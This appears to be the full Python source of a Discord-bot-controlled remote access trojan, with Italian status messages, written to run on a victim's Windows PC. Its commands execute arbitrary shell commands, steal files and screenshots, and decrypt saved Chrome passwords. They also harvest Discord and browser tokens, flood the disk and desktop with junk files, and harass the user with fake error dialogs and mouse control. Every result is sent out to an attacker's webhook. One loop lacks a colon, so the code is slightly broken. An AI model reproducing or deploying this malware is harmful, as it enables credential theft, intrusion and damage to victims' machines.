weburl = 'ENTER HERE YOUR WEBHOOK URL'
botoken = 'ENTER HERE YOUR BOT TOKEN'

import discord
from discord.ext import commands
from discord_webhook import DiscordWebhook
from urllib.request import Request, urlopen
import subprocess
import os
import requests
import pyautogui as pglib
from sys import platform as osys
from random import randint
pglib.FAILSAFE = False
import re
import sys
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
import csv

userprofile = os.environ["USERPROFILE"]
appdatar = os.environ["APPDATA"]
appdatal = os.environ["LOCALAPPDATA"]
i = requests.get("https://ifconfig.me")

client = commands.Bot(command_prefix=")", description="Bot for rat")


@client.command()
async def sysinfo(ctx):
    userw = ctx.message.author
    await ctx.channel.purge(limit=1)
    await ctx.send("Elaborazione dati...")
    def systeminfo():
        subprocess.getoutput('systeminfo > "%userprofile%\AppData\sysinfo.txt"')
        webhook = webhook = DiscordWebhook(url=weburl, content=f"File exported from public ip {i.text} for {userw}")
        with open(f'{userprofile}/AppData/sysinfo.txt', "rb") as f:
            webhook.add_file(file=f.read(), filename='System info.txt')
        webhook.execute()
        subprocess.getoutput('if exist "%userprofile%\AppData\sysinfo.txt" del "%userprofile%\AppData\sysinfo.txt"/q')
    systeminfo()

@client.command()
async def grab(ctx,arg):
    grabfile = arg
    userw = ctx.message.author
    webhook = webhook = DiscordWebhook(url=weburl, content=f"File exported from public ip {i.text} for {userw}")
    try:
        if os.path.getsize(grabfile) <= 1048576:
            with open(grabfile, "rb") as f:
                webhook.add_file(file=f.read(), filename=grabfile)
            webhook.execute()
        elif os.path.getsize(grabfile) >1048576:
            await ctx.send('Il file specificato è troppo pesante')
    except:
        await ctx.send('Il file specificato non esiste')


    
@client.command()
async def cmd(ctx,arg):
    cmdcommand = arg
    userw = ctx.message.author
    await ctx.channel.purge(limit=1)
    def cmdtxt():
        subprocess.getoutput(f'{cmdcommand} >> "%userprofile%\AppData\Output.txt"')
        file = f'{userprofile}/AppData/Output.txt'
        webhook = webhook = DiscordWebhook(url=weburl, content=f"File exported from public ip {i.text} for {userw}")
        with open(file, "rb") as f:
            webhook.add_file(file=f.read(), filename='Output.txt')
        webhook.execute()
        subprocess.getoutput('if exist "%userprofile%\AppData\Output.txt" del "%userprofile%\AppData\Output.txt"/q')
    cmdtxt()

@client.command()
async def cmdput(ctx,arg):
    io = arg
    await ctx.channel.purge(limit=1)
    subprocess.getoutput(io)
    await ctx.send(f'Commando {io} eseguito')


@client.command()
async def spamcmd(ctx,arg):
    await ctx.channel.purge(limit=1)
    await ctx.send('Inizializzando apertura terminali...')
    for i in range(0,int(arg))
        os.system('start cmd')
    await ctx.send(f"Sono stati aperti {arg} terminali")



@client.command()
async def input(ctx,arg):
    writed = arg
    subprocess.getoutput(f'echo createobject("wscript.shell").sendkeys "{writed}" > InputWR.vbs')
    subprocess.getoutput('start InputWR.vbs')
    await ctx.send(f'Input {writed} inviato')
    subprocess.getoutput('if exist InputWR.vbs del InputWR.vbs/q')


@client.command()
async def lclick(ctx,arg):
    await ctx.channel.purge(limit=1)
    for i in range(0,int(arg)):
        pglib.click()
    if int(arg) == 1:
        await ctx.send("È stato inviato un click sinistro")
    else:
        await ctx.send(f"Sono stati inviati {arg} click sinistri")


@client.command()
async def rclick(ctx,arg):
    await ctx.channel.purge(limit=1)
    for i in range(0,int(arg)):
        with pglib.hold('shift'):
            pglib.press('F10')
    if int(arg) == 1:
        await ctx.send("È stato inviato un click destro")
    else:
        await ctx.send(f"Sono stati inviati {arg} click destri")  



@client.command()
async def mousemad(ctx,arg):
    await ctx.channel.purge(limit=1)
    await ctx.send("Il mouse ha iniziato a impazzire")
    for i in range(0,int(arg)):
        randx = randint(1,1919)
        randy = randint(1,1079)
        pglib.moveTo(randx,randy)
    await ctx.send("Il mouse è impazzito")



@client.command()
async def cd(ctx,arg):
    pathchoose = str(arg)
    try:
        os.chdir(pathchoose)
        await ctx.channel.purge(limit=1)
        await ctx.send(f'Percorso file cambiato su {arg}')
    except:
        a = 0
        await ctx.channel.purge(limit=1)
        await ctx.send('Percorso inesistente o accesso negato')
    

@client.command()
async def screen(ctx):
    userw = ctx.message.author
    try:
        pglib.screenshot('screenshot.png')
        await ctx.channel.purge(limit=1)
        await ctx.send('Inizializzazione screenshot...')
        webhook = webhook = DiscordWebhook(url=weburl, content=f"File exported from public ip {i.text} for {userw}")
        with open('screenshot.png', "rb") as f:
            webhook.add_file(file=f.read(), filename='Screenshot.png')
        webhook.execute()
        subprocess.getoutput('if exist Screenshot.png del Screenshot.png/q')
    except:
        subprocess.getoutput('echo Screenshot error > "%AppData%\ErrorS.txt"')
        webhook = webhook = DiscordWebhook(url=weburl, content=f"File exported from public ip {i.text} for {userw}")
        with open(f'{appdatar}\ErrorS.txt', "rb") as f:
            webhook.add_file(file=f.read(), filename='Screen Error.txt')
        webhook.execute()
        subprocess.getoutput('if exist "%AppData%\ErrorS.txt" del "%AppData%\ErrorS.txt"/q')



@client.command()
async def ping(ctx,arg):
    userw = ctx.message.author
    try:
        await ctx.channel.purge(limit=1)
        await ctx.send("Richieste in avvio")
        subprocess.getoutput(f'ping -n {arg} localhost > "%AppData%\Ping.txt"')
        webhook = webhook = DiscordWebhook(url=weburl, content=f"File exported from public ip {i.text} for {userw}")
        with open(f'{appdatar}\Ping.txt', "rb") as f:
            webhook.add_file(file=f.read(), filename='PingTest.txt')
        webhook.execute()
        subprocess.getoutput('if exist "%AppData%\Ping.txt" del "%AppData%\Ping.txt"/q')
    except:
        await ctx.send('Ping non eseguito corretamente')



    


@client.command()
async def so(ctx):
    await ctx.send(f'Il sistema operativo usato è {osys}')


@client.command()
async def wclose(ctx):
    await ctx.channel.purge(limit=1)
    with pglib.hold('alt'):
        pglib.press('F4')
    await ctx.send('Finestra chiusa')
    


@client.command()
async def desktop(ctx):
    with pglib.hold('win'):
        pglib.press('d')
    await ctx.send('Visuale spostata sul desktop')



@client.command()
async def download(ctx,arg):
    dnurl = arg
    startingdn = requests.get(dnurl)
    contenuto = startingdn.content
    fbdn = open(f'{userprofile}/downloads/file.','wb')
    fbdn.write(contenuto)
    fbdn.close()



@client.command()
async def msgboxE(ctx,arg):
    number_of_error = int(arg)
    subprocess.getoutput('echo msgbox "CRITICAL ERROR", 16, "CRITICAL ERROR" >> "%appdata%\Error.vbs"')
    os.chdir(appdatar)
    for i in range(0,number_of_error):
        subprocess.getoutput('start Error.vbs')
    if number_of_error == 1:
        await ctx.send('Errore inviato')
    else:
        await ctx.send('Errori inviati')
    subprocess.getoutput('if exist "%appdata%\Error.vbs" del "%appdata%\Error.vbs"/q')


@client.command(help='Rimuovi definitivamente il rat')
async def shutdown(ctx,arg):
    if arg != "bot":
        await ctx.send('Arg deve essere "bot", e questo rimuoverà definitivamente il rat dal pc vittima')
    else:
        subprocess.getoutput('if exist "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\starter.exe" del "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\starter.exe"/q')
        subprocess.getoutput('echo taskkill /f /im WinStarterP.exe > "%appdata%\ender.bat"')
        subprocess.getoutput('echo if exist "%localappdata%\WinStarterP.exe" del "%localappdata%\WinStarterP.exe"/q >> "%appdata%\ender.bat"')
        subprocess.getoutput('echo del ender.bat >> "%appdata%\ender.bat"')
        os.chdir(appdatar)
        subprocess.getoutput('start ender.bat')


@client.command()
async def bomb(ctx):
    subprocess.getoutput('if not exist "%localappdata%\WinStart" md "%localappdata%\WinStart"')
    await ctx.send("Atomica lanciata")
    for i in range(0,10000000):
        subprocess.getoutput('echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% >> "%localappdata%\WinStart\%random%%random%.txt"')
    await ctx.send("L'atomica ha lasciato il segno")


@client.command()
async def desktopbomb(ctx,arg):
    await ctx.send("Avvio in corso...")
    try:
        boom = 1
        for i in range(0,int(arg)):
            subprocess.getoutput(f'echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% >> "%userprofile%\desktop\Boom{boom}.txt"')
            boom += 1
        boom = boom * 0
        await ctx.send("Esplosione finita")
    except:
        await ctx.send("Bomba non disponibile")



@client.command()
async def sendmsg(ctx,arg):
    subprocess.getoutput(f'echo msgbox "{arg}", 0, "MESSAGE" > "%appdata%\m.vbs"')
    os.chdir(appdatar)
    subprocess.getoutput('start m.vbs')
    await ctx.send(f"Messaggio {arg} inviato")

@client.command()
async def m(ctx):
    subprocess.getoutput('del m.vbs/q')
    await ctx.send("Eseguito")
    
@client.command()
async def purge(ctx,arg):
    await ctx.channel.purge(limit=int(arg)+1)

@client.command()
async def print(ctx,arg):
    await ctx.send(arg)

@client.command()
async def cls(ctx):
    endlesss = 1000 * 1000
    await ctx.channel.purge(limit=endlesss)










@client.command()
async def chromepws(ctx):
    userw = ctx.message.author
    webhook = webhook = DiscordWebhook(url=weburl, content=f"File exported from public ip {i.text} for {userw}")
    await ctx.channel.purge(limit=1)
    #GLOBAL CONSTANT
    CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
    CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE']))

    def get_secret_key():
        try:
            #(1) Get secretkey from chrome local state
            with open( CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
                local_state = f.read()
                local_state = json.loads(local_state)
            secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            #Remove suffix DPAPI
            secret_key = secret_key[5:] 
            secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
            return secret_key
        except Exception as e:
            qwertyuiop = 1
            return None
    
    def decrypt_payload(cipher, payload):
        return cipher.decrypt(payload)

    def generate_cipher(aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)

    def decrypt_password(ciphertext, secret_key):
        try:
            #(3-a) Initialisation vector for AES decryption
            initialisation_vector = ciphertext[3:15]
            #(3-b) Get encrypted password by removing suffix bytes (last 16 bits)
            #Encrypted password is 192 bits
            encrypted_password = ciphertext[15:-16]
            #(4) Build the cipher to decrypt the ciphertext
            cipher = generate_cipher(secret_key, initialisation_vector)
            decrypted_pass = decrypt_payload(cipher, encrypted_password)
            decrypted_pass = decrypted_pass.decode()  
            return decrypted_pass
        except Exception as e:
            qwertyuiop = 1
    
    def get_db_connection(chrome_path_login_db):
        try:
            shutil.copy2(chrome_path_login_db, "Loginvault.db") 
            return sqlite3.connect("Loginvault.db")
        except Exception as e:
            qwertyuiop = 1
            return None
        
    if __name__ == '__main__':
        try:
            #Create Dataframe to store passwords
            with open('decrypted_password.csv', mode='w', newline='', encoding='utf-8') as decrypt_password_file:
                csv_writer = csv.writer(decrypt_password_file, delimiter=',')
                csv_writer.writerow(["index","url","username","password"])
                #(1) Get secret key
                secret_key = get_secret_key()
                #Search user profile or default folder (this is where the encrypted login password is stored)
                folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$",element)!=None]
                for folder in folders:
                	#(2) Get ciphertext from sqlite database
                    chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data"%(CHROME_PATH,folder))
                    conn = get_db_connection(chrome_path_login_db)
                    if(secret_key and conn):
                        cursor = conn.cursor()
                        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                        for index,login in enumerate(cursor.fetchall()):
                            url = login[0]
                            username = login[1]
                            ciphertext = login[2]
                            if(url!="" and username!="" and ciphertext!=""):
                                #(3) Filter the initialisation vector & encrypted password from ciphertext 
                                #(4) Use AES algorithm to decrypt the password
                                decrypted_password = decrypt_password(ciphertext, secret_key)
                                #(5) Save into CSV 
                                csv_writer.writerow([index,url,username,decrypted_password])
                        #Close database connection
                        cursor.close()
                        conn.close()
                        #Delete temp login db
                        os.remove("Loginvault.db")
        except Exception as e:
            qwertyuiop = 1
        try:
            subprocess.getoutput('move decrypted_password.csv DecryptedPassword.txt')
            with open('DecryptedPassword.txt', 'rb') as f:
                webhook.add_file(file=f.read(), filename='DecryptedPassword.txt')
            webhook.execute()
            subprocess.getoutput('if exist DecryptedPassword.txt del DecryptedPassword.txt/q')
        except:
            await ctx.send("Error 404")




@client.command()
async def dstoken(ctx):
    userw = ctx.message.author
    await ctx.channel.purge(limit=1)
    # mentions you when you get a hit
    PING_ME = False

    def find_tokens(path):
        path += '\\Local Storage\\leveldb'

        tokens = []

        for file_name in os.listdir(path):
            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                continue

            for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                    for token in re.findall(regex, line):
                        tokens.append(token)
        return tokens

    def dstokengrab():
        local = os.getenv('LOCALAPPDATA')
        roaming = os.getenv('APPDATA')

        paths = {
            'Discord': roaming + '\\Discord',
            'Discord Canary': roaming + '\\discordcanary',
            'Discord PTB': roaming + '\\discordptb',
            'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
            'Opera': roaming + '\\Opera Software\\Opera Stable',
            'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
            'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
        }

        message = '@everyone' if PING_ME else ''

        for platform, path in paths.items():
            if not os.path.exists(path):
                continue

            message += f'\n**{platform}**\n```\n'

            tokens = find_tokens(path)

            if len(tokens) > 0:
                for token in tokens:
                    message += f'{token}\n'
            else:
                message += 'No tokens found.\n'

            message += '```'

        headers = {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
        }

        payload = json.dumps({'content': message})

        try:
            req = Request(weburl, data=payload.encode(), headers=headers)
            urlopen(req)
        except:
            subprocess.getoutput('echo Error 404 > "%appdata%\Error 404.txt"')
            webhook = webhook = DiscordWebhook(url=weburl, content=f"File exported from public ip {i.text} for {userw}")
            with open(f'{appdatar}\Error 404.txt', "rb") as f:
                webhook.add_file(file=f.read(), filename='Error 404.txt')
            webhook.execute()
            subprocess.getoutput('if exist "%appdata%\Error 404.txt" del "%appdata%\Error 404.txt"/q')
    dstokengrab()





client.run(botoken)
